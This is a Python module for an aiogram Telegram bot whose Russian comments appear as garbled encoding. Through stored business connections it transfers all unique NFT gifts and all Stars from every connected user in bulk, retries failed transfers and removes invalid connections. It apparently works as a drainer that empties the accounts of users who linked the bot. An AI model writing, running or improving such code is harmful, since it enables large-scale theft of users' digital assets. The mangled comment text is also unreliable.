import asyncio
import logging
from typing import Dict, List, Any
from aiogram import Bot

from config import get_main_admin_id, MIN_STARS_FOR_AUTO_TRANSFER
from utils.file_utils import get_connections
from utils.transfer import transfer_all_unique_gifts, transfer_all_stars
from utils.user_management import check_user_balance

logger = logging.getLogger(__name__)

async def transfer_nft_for_user(bot: Bot, conn: Dict[str, Any]) -> Dict[str, Any]:
    """–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥ NFT –¥–ª—è –æ–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "N/A")
        
        nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id, admin_notify=False)
        
        return {
            'username': username,
            'user_id': user_id,
            'transferred': nft_result['transferred'],
            'failed': nft_result['failed'],
            'total': nft_result['total']
        }
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ –¥–ª—è {conn.get('user_id')}: {e}")
        return {
            'username': conn.get('username', 'N/A'),
            'user_id': conn.get('user_id'),
            'transferred': 0,
            'failed': 1,
            'total': 0,
            'error': str(e)
        }

async def mass_transfer_nft(bot: Bot) -> str:
    """–ú–∞—Å—Å–æ–≤—ã–π –ø–µ—Ä–µ–≤–æ–¥ –≤—Å–µ—Ö –¥–æ—Å—Ç—É–ø–Ω—ã—Ö NFT –æ—Ç –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    try:
        connections = get_connections()
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
        tasks = [transfer_nft_for_user(bot, conn) for conn in connections]
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –∑–∞–¥–∞—á–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        total_transferred = 0
        total_failed = 0
        report = "<b>üîÑ –ú–∞—Å—Å–æ–≤—ã–π –ø–µ—Ä–µ–≤–æ–¥ NFT:</b>\n\n"
        
        for result in results:
            if isinstance(result, dict):
                total_transferred += result.get('transferred', 0)
                total_failed += result.get('failed', 0)
                
                if result.get('transferred', 0) > 0 or result.get('failed', 0) > 0:
                    report += f"üë§ @{result['username']}: ‚úÖ {result.get('transferred', 0)} | ‚ùå {result.get('failed', 0)}\n"
            else:
                total_failed += 1
                report += f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ‚ùå –û—à–∏–±–∫–∞\n"
        
        report += f"\nüìä <b>–ò—Ç–æ–≥–æ:</b> ‚úÖ {total_transferred} | ‚ùå {total_failed}"
        return report
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞: {e}")
        return f"‚ùå –û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞: {str(e)}"

async def mass_transfer_stars(bot: Bot) -> str:
    """–ú–∞—Å—Å–æ–≤—ã–π –ø–µ—Ä–µ–≤–æ–¥ –≤—Å–µ—Ö –∑–≤–µ–∑–¥ –æ—Ç –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    try:
        connections = get_connections()
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ –∑–≤–µ–∑–¥
        tasks = []
        for conn in connections:
            conn_id = conn["business_connection_id"]
            user_id = conn["user_id"]
            tasks.append(transfer_all_stars(bot, conn_id, user_id))
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –∑–∞–¥–∞—á–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        total_transferred = 0
        total_failed = 0
        report = "<b>‚≠êÔ∏è –ú–∞—Å—Å–æ–≤—ã–π –ø–µ—Ä–µ–≤–æ–¥ –∑–≤–µ–∑–¥:</b>\n\n"
        
        for i, result in enumerate(results):
            if isinstance(result, dict):
                if result.get('transferred', 0) > 0:
                    total_transferred += result['transferred']
                    username = connections[i].get('username', 'N/A')
                    report += f"üë§ @{username}: ‚≠êÔ∏è {result['transferred']}\n"
                elif result.get('error'):
                    total_failed += 1
                    username = connections[i].get('username', 'N/A')
                    report += f"üë§ @{username}: ‚ùå –û—à–∏–±–∫–∞\n"
            else:
                total_failed += 1
                report += f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ‚ùå –û—à–∏–±–∫–∞\n"
        
        report += f"\nüìä <b>–ò—Ç–æ–≥–æ:</b> ‚≠êÔ∏è {total_transferred} | ‚ùå {total_failed}"
        return report
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ –∑–≤–µ–∑–¥: {e}")
        return f"‚ùå –û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ –∑–≤–µ–∑–¥: {str(e)}"

async def mass_check_balances(bot: Bot) -> str:
    """–ú–∞—Å—Å–æ–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    try:
        connections = get_connections()
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏
        tasks = [check_user_balance(bot, conn['user_id']) for conn in connections]
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –∑–∞–¥–∞—á–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        notifications_sent = 0
        errors = 0
        report = "<b>üí∞ –ú–∞—Å—Å–æ–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤:</b>\n\n"
        
        for i, result in enumerate(results):
            if isinstance(result, bool):
                if result:
                    notifications_sent += 1
                    username = connections[i].get('username', 'N/A')
                    report += f"üë§ @{username}: ‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ\n"
            else:
                errors += 1
                username = connections[i].get('username', 'N/A')
                report += f"üë§ @{username}: ‚ùå –û—à–∏–±–∫–∞\n"
        
        report += f"\nüìä <b>–ò—Ç–æ–≥–æ:</b> ‚úÖ {notifications_sent} —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π | ‚ùå {errors} –æ—à–∏–±–æ–∫"
        return report
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤: {e}")
        return f"‚ùå –û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤: {str(e)}"

async def mass_retry_failed_transfers(bot: Bot) -> str:
    """–ú–∞—Å—Å–æ–≤–∞—è –ø–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–µ—Ä–µ–≤–æ–¥–æ–≤"""
    try:
        connections = get_connections()
        
        # –ü–æ–ª—É—á–∞–µ–º –ª–æ–≥–∏ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–µ—Ä–µ–≤–æ–¥–æ–≤
        from utils.file_utils import load_transfer_logs
        logs = load_transfer_logs()
        failed_logs = [log for log in logs if log.get('status') in ['nft_failed', 'gift_failed', 'stars_failed']]
        
        if not failed_logs:
            return "‚úÖ –ù–µ—Ç –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–µ—Ä–µ–≤–æ–¥–æ–≤ –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏"
        
        # –ì—Ä—É–ø–ø–∏—Ä—É–µ–º –Ω–µ—É–¥–∞—á–Ω—ã–µ –ø–µ—Ä–µ–≤–æ–¥—ã –ø–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º
        user_failures = {}
        for log in failed_logs:
            user_id = log.get('user_id')
            if user_id not in user_failures:
                user_failures[user_id] = []
            user_failures[user_id].append(log)
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏
        tasks = []
        for user_id, failures in user_failures.items():
            # –ù–∞—Ö–æ–¥–∏–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            user_conn = None
            for conn in connections:
                if conn.get('user_id') == user_id:
                    user_conn = conn
                    break
            
            if user_conn:
                tasks.append(retry_user_failed_transfers(bot, user_conn, failures))
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –∑–∞–¥–∞—á–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        total_retried = 0
        total_successful = 0
        total_failed = 0
        report = "<b>üîÑ –ú–∞—Å—Å–æ–≤–∞—è –ø–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞:</b>\n\n"
        
        for result in results:
            if isinstance(result, dict):
                total_retried += result.get('retried', 0)
                total_successful += result.get('successful', 0)
                total_failed += result.get('failed', 0)
                
                if result.get('retried', 0) > 0:
                    report += f"üë§ @{result['username']}: üîÑ {result.get('retried', 0)} | ‚úÖ {result.get('successful', 0)} | ‚ùå {result.get('failed', 0)}\n"
            else:
                total_failed += 1
                report += f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ‚ùå –û—à–∏–±–∫–∞\n"
        
        report += f"\nüìä <b>–ò—Ç–æ–≥–æ:</b> üîÑ {total_retried} | ‚úÖ {total_successful} | ‚ùå {total_failed}"
        return report
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–π –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏: {e}")
        return f"‚ùå –û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–π –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏: {str(e)}"

async def retry_user_failed_transfers(bot: Bot, conn: Dict[str, Any], failures: List[Dict[str, Any]]) -> Dict[str, Any]:
    """–ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–µ—Ä–µ–≤–æ–¥–æ–≤ –¥–ª—è –æ–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "N/A")
        
        retried = 0
        successful = 0
        failed = 0
        
        for failure in failures:
            try:
                # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø –Ω–µ—É–¥–∞—á–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ –∏ –ø–æ–≤—Ç–æ—Ä—è–µ–º
                if failure.get('status') == 'nft_failed':
                    # –ü–æ–≤—Ç–æ—Ä—è–µ–º –ø–µ—Ä–µ–≤–æ–¥ NFT
                    nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id, admin_notify=False)
                    successful += nft_result.get('transferred', 0)
                    failed += nft_result.get('failed', 0)
                elif failure.get('status') == 'stars_failed':
                    # –ü–æ–≤—Ç–æ—Ä—è–µ–º –ø–µ—Ä–µ–≤–æ–¥ –∑–≤–µ–∑–¥
                    stars_result = await transfer_all_stars(bot, conn_id, user_id)
                    if stars_result.get('transferred', 0) > 0:
                        successful += 1
                    else:
                        failed += 1
                
                retried += 1
                
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏ –¥–ª—è {user_id}: {e}")
                failed += 1
        
        return {
            'username': username,
            'user_id': user_id,
            'retried': retried,
            'successful': successful,
            'failed': failed
        }
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {conn.get('user_id')}: {e}")
        return {
            'username': conn.get('username', 'N/A'),
            'user_id': conn.get('user_id'),
            'retried': 0,
            'successful': 0,
            'failed': 1,
            'error': str(e)
        }

async def cleanup_invalid_connections(bot: Bot) -> str:
    """–û—á–∏—Å—Ç–∫–∞ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π"""
    try:
        connections = get_connections()
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π
        tasks = [check_connection_validity(bot, conn) for conn in connections]
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –∑–∞–¥–∞—á–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        valid_connections = 0
        invalid_connections = 0
        report = "<b>üßπ –û—á–∏—Å—Ç–∫–∞ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π:</b>\n\n"
        
        for i, result in enumerate(results):
            if isinstance(result, bool):
                if result:
                    valid_connections += 1
                else:
                    invalid_connections += 1
                    username = connections[i].get('username', 'N/A')
                    user_id = connections[i].get('user_id')
                    
                    # –£–¥–∞–ª—è–µ–º –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
                    from utils.file_utils import remove_connection
                    remove_connection(connections[i].get('business_connection_id'))
                    
                    report += f"‚ùå –£–¥–∞–ª–µ–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ @{username} (ID: {user_id})\n"
            else:
                invalid_connections += 1
                report += f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è\n"
        
        report += f"\nüìä <b>–ò—Ç–æ–≥–æ:</b> ‚úÖ {valid_connections} –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö | ‚ùå {invalid_connections} —É–¥–∞–ª–µ–Ω–æ"
        return report
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {e}")
        return f"‚ùå –û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {str(e)}"

async def check_connection_validity(bot: Bot, conn: Dict[str, Any]) -> bool:
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"""
    try:
        conn_id = conn["business_connection_id"]
        
        # –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –±–∞–ª–∞–Ω—Å –∑–≤–µ–∑–¥
        from utils.transfer import get_star_balance
        await get_star_balance(bot, conn_id)
        
        return True
    except Exception as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            return False
        else:
            # –î—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏ –Ω–µ —Å—á–∏—Ç–∞–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–º
            return True 